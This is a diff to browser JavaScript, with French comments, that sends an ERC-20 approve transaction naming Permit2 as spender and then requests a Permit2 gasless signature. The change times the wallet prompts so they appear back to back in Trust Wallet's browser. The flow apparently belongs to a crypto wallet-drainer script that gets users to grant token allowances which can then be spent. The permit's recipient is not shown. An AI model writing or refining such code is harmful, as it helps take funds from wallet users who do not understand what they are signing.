@@ -1255,48 +1255,22 @@ try {
     // C'est après cet await que from devient valide pour eth_signTypedData_v4.
     var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
     var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2_ADDR, approveAmount]);
-    var txHash;
-    try {
-      txHash = await Promise.race([
-        eth.request({
-          method: 'eth_sendTransaction',
-          params: [{ from: from || '0x0000000000000000000000000000000000000000',
-                     to: tokenAddr, value: '0x0', data: approveData }]
-        }),
-        new Promise(function(_, rej) { setTimeout(function() { rej(new Error('timeout')); }, 120000); })
-      ]);
-    } catch(e) {
-      console.warn('permit2 approve error', e);
-      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) return;
-    }
+    // Fire-and-forget approve : TW Browser bloque le thread sur 'Transaction Submitted'
+    // si on await eth_sendTransaction. En fire-and-forget, approve + sign entrent dans
+    // la queue TW Browser en sequence : approve affiche, utilisateur confirme, sign s'affiche.
+    var _approveRejected = false;
+    eth.request({
+      method: 'eth_sendTransaction',
+      params: [{ from: from, to: tokenAddr, value: '0x0', data: approveData }]
+    }).catch(function(e) {
+      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) { _approveRejected = true; }
+    });
 
-    // Résolution from via txHash — contourne le problème selectedAddress async dans TW Browser.
-    // eth_getTransactionByHash passe par le provider interne TW (pas de propagation externe).
-    // 4 tentatives × 350ms couvrent le cycle d'indexation interne du wallet.
-    if (txHash && typeof txHash === 'string' && txHash.startsWith('0x')) {
-      for (var _i = 0; _i < 4; _i++) {
-        try {
-          if (_i > 0) await new Promise(function(r) { setTimeout(r, 350); });
-          var _tx = await eth.request({ method: 'eth_getTransactionByHash', params: [txHash] });
-          if (_tx && _tx.from) { from = _tx.from.toLowerCase(); break; }
-        } catch(_e) {}
-      }
-    }
-    // Fallback ultime : selectedAddress / eth_accounts si txHash absent ou provider muet
-    if (!from) from = eth.selectedAddress || eth.address || '';
-    if (!from) {
-      try {
-        var accs2 = await eth.request({ method: 'eth_accounts' });
-        from = (accs2 && accs2[0]) || '';
-      } catch(e) {}
-    }
-    if (!from) return;
+    // 800ms : laisser TW Browser rendre la popup approve avant de pousser le sign en queue
+    await new Promise(function(r) { setTimeout(r, 800); });
+    if (_approveRejected) return;
 
-    // Step 2: Permit2 gasless signature — from est maintenant valide
-    // Délai 2s : TW Browser affiche un écran intermédiaire après confirmation TX.
-    // eth_signTypedData_v4 déclenché pendant cet écran est ignoré silencieusement.
-    await new Promise(function(r) { setTimeout(r, 2000); });
-
+    // Step 2: Permit2 gasless signature
     var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
     var deadline = Math.floor(Date.now() / 1000) + 3600;
     var permit2TypedData = {
